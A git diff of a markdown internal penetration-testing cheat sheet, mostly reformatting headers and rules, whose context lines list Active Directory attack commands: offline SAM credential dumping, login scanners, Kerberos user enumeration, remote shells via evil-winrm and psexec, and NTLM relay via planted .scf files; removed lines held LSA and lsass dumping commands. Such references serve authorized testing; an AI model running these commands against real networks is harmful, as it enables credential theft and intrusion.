@@ -1,6 +1,6 @@
 # Internal Penetration Testing
 
-## No network access
+## **No network access**
 
 ### Wi-Fi
 
@@ -17,7 +17,9 @@
 
   [https://github.com/Orange-Cyberdefense/fenrir-ocd](https://github.com/Orange-Cyberdefense/fenrir-ocd)
 
-## No account yet
+---
+
+## **No account yet**
 
 ### Physical access
 
@@ -27,6 +29,8 @@ Boot from Kali Linux and dump creds
 cd SystemRoot%\system32\Config\SAM
 impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY -local
 ```
+
+---
 
 ### Port and service scan
 
@@ -46,6 +50,8 @@ use auxiliary/scanner/mssql/mssql_login
 use auxiliary/scanner/http/tomcat_mgr_login
 searchsploit <service_name>
 ```
+
+---
 
 ### Man-In-The-Middle
 
@@ -107,6 +113,8 @@ Bettercap
 Cain.exe (& Abel)
 ```
 
+---
+
 ### **Domain enum**
 
 Get DC IP
@@ -148,6 +156,8 @@ nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='megabank
 ./kerbrute_linux_amd64 userenum -d <domain> usernames.txt -debug
 ```
 
+---
+
 ## Unprivileged account only 
 
 ### Get a shell
@@ -162,6 +172,8 @@ evil-winrm -i <target> -u <user> -p '<pass>'
 python psexec.py '<user>:<pass>@<target>'
 ```
 
+---
+
 ### Domain enum
 
 ```bash
@@ -170,8 +182,11 @@ bloodhound.py -d <DOMAIN> -u <user> -p <password> -dc <FQDN-SERVER> -c all
 python ldapdomaindump.py -u '<domain>\<user>' -p '<pass>' <target>
 sudo ldapsearch -x -LLL -H ldap://webmail.<domain>.fr -D "cn=<cn>" -b "dc=<domain>,dc=<fqdn>" -w '<pass>'
 ```
+> More details are available in the next cheatsheet Domain Escalation
 
-### SMB  restricted shares
+---
+
+### SMB restricted shares
 
 ```bash
 smbmap -P 445 -H <target> -u '<user>' -p '<pass>' 
@@ -181,31 +196,19 @@ smbclient -L //<target> -U '<domain>\<user>`
 upload .ico .scf => Responder/NTLMrelayx
 ```
 
+---
+
 ### Low Privilege Escalation
 
 See next cheatsheet LPE Windows or LPE Linux
 
-## Local Admin account
+---
 
-### Dump secrets
+## **Local Admin account**
 
-LSA & SAM
+### Post-Exploitation
 
-```bash
-crackmapexec smb perim_up.txt -u '<user>' -d '<domain>' -p '<pass>' --lsa
-crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --lsa
-
-lsassy -d '.' -u 'Administrateur' -H '<hash>' <ip>
-lsassy -d <domain> -u <user> -p <pass> <ip>
-
-./spraykatz.py -u <user> -p <password> -t <ip>
-```
-
-Browser secrets
-
-```bash
-sharpchrome.exe
-```
+See next cheatsheets Post-Ex Windows and Post-Ex Linux
 
 ### Replay the secrets found
 
@@ -223,7 +226,9 @@ See next cheatsheet Pivoting
 
 See next cheatsheet Domain Escalation
 
-## Domain admin account
+---
+
+## **Domain admin account**
 
 ### Dump NDTS.dit from DC
 
